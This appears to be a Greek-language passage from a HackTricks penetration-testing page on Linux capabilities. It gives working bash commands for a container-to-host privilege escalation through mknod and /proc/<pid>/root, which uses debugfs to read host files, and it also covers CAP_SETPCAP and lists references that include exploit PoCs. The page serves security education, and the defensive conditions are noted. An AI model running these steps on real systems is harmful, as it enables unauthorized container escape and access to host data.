Υπάρχει επίσης μια ξεχωριστή τεχνική **two-foothold local privilege-escalation**, η οποία δεν πρέπει να συγχέεται με την απευθείας πρόσβαση σε συσκευές του container. Μια διεργασία root σε ένα container που μοιράζεται το αρχικό user namespace μπορεί να δημιουργήσει ένα block-device node, ενώ ένα μη προνομιούχο shell στο host με αντίστοιχο UID ανοίγει αυτό το node μέσω του `/proc/<container-pid>/root`. Στη συνέχεια, το άνοιγμα αξιολογείται στο cgroup του shell στο host, οπότε η άρνηση πρόσβασης από το device cgroup του container δεν προστατεύει πλέον τη συσκευή.<sup>[[7]](#references)</sup>

Μέσα στο container, δημιουργήστε το node και αφήστε μια διεργασία να εκτελείται με το UID του υπάρχοντος foothold στο host:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Από το υπάρχον shell του host με αυτό το UID, εντοπίστε το PID του host για τη διεργασία container που βρίσκεται σε αναμονή και χρησιμοποιήστε το root του procfs ως διαδρομή προς τη συσκευή:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Αυτή η αλυσίδα απαιτεί και τα δύο footholds, ένα identity-mapped ή κοινόχρηστο user namespace, δικαίωμα διέλευσης από το `/proc/<pid>/root` του στόχου, μια πραγματική συσκευή με σωστούς major/minor numbers και ένα εξωτερικό cgroup που επιτρέπει το άνοιγμα. Τα `hidepid`, οι κανόνες πρόσβασης του ptrace, ένα LSM, η ασυμβατότητα του filesystem ή η αντιστοίχιση user namespace μπορούν να τη διακόψουν. Η ιστορική τεχνική είναι πολύτιμη ακριβώς επειδή εξηγεί πώς το `/proc/<pid>/root` μπορεί να παρακάμψει τον περιορισμό του device cgroup *του container*· δεν ισχυρίζεται ότι το `CAP_MKNOD` από μόνο του επιτρέπει τη διαφυγή από ένα κανονικά απομονωμένο container.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Σε σύγχρονους πυρήνες Linux με file capabilities, το **`CAP_SETPCAP`** επιτρέπει σε ένα thread να προσθέτει capabilities από το bounding set του στο inheritable set του, να αφαιρεί capabilities από το bounding set του και να αλλάζει τα securebits του. Δεν επιτρέπει σε μια διεργασία να παραχωρεί αυθαίρετα capabilities σε άλλη διεργασία· αυτή η συμπεριφορά ισχύει μόνο σε πυρήνες προγενέστερους της έκδοσης 2.6.25, χωρίς υποστήριξη file capabilities.<sup>[[14]](#references)</sup>

Η system call `capset()` μπορεί να προσαρμόσει τα effective, permitted και inheritable sets ενός thread, αλλά το νέο permitted set δεν μπορεί να περιέχει capabilities που δεν υπάρχουν στο ήδη υπάρχον permitted set, ενώ οι ενημερώσεις του inheritable set εξακολουθούν να υπόκεινται στους περιορισμούς του kernel.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Εργαστήρια κλιμάκωσης προνομίων με Linux capabilities](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Κλιμάκωση προνομίων στο Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Βασικά στοιχεία των Linux Containers: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Αξιοποίηση των Linux Capabilities](https://www.linuxjournal.com/article/5737)
- [6] [Υπερβολικά Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Κατάχρηση πρόσβασης σε mount namespaces μέσω του /proc/pid/root](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux Capabilities: Γιατί υπάρχουν και πώς λειτουργούν](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Κατανόηση των Capabilities στο Linux](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC για παράκαμψη του seccomp όταν επιτρέπεται το ptrace](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [Πώς να ξεφύγετε από διάφορες λύσεις chroot](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - αρχικό exploit διαφυγής από Docker με CAP_DAC_READ_SEARCH, του Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Ανάλυση exploit διαφυγής από Docker](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Σελίδα εγχειριδίου Ubuntu](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Εκτέλεση containers - Τεκμηρίωση Docker](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Τεκμηρίωση Docker](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
